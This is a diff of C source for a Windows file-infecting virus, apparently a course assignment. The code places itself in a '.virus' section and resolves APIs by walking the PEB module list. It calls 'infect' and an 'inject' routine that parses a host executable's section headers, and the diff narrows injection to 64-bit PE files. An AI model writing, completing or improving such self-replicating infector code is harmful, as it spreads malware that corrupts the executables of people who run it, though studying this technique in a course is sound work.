@@ -9,9 +9,10 @@
 // #define KERNEL32_DLL 3
 // #define CURRENT_EXE 1
 
-#define DO_TASK1 1
+#define DO_TASK1 0
 
-#define NAME_OF_NEW_FILE "2021302181087"
+#define NAME_OF_NEW_FILE "THE_COPY"
+
 #define V_SECT_NAME ".virus"
 #define SET_SECT __attribute__((section(V_SECT_NAME)))
 
@@ -82,7 +83,7 @@ void payload(void)
     char s_puts[] = "puts";
     char s_printf[] = "printf";
 
-    // get_InMemoryOrderModuleList <a id="specific-line"></a>
+    // get_InMemoryOrderModuleList 
     LIST_ENTRY *list = 0;
     {
         PEB *peb = 0; 
@@ -123,8 +124,8 @@ void payload(void)
 
 #if DO_TASK1
     CALL(task1);
-    task1_ret: asm("nop");
 #endif
+    task1_ret: asm("nop");
 
     // 
     CALL(infect);
@@ -263,7 +264,8 @@ inject:{
     IMAGE_SECTION_HEADER i_sect_header = {0};
     int raw_data_size = 0;
 
-    int injectable = 1;
+    // int injectable = 1;
+    int injectable = (i_nt_headers.OptionalHeader.Magic == 0x020B);
     for (int i = 0; i < i_nt_headers.FileHeader.NumberOfSections; i++)
     {
         FUNCTION(fread)(&i_sect_header, 1, sizeof(i_sect_header), host);
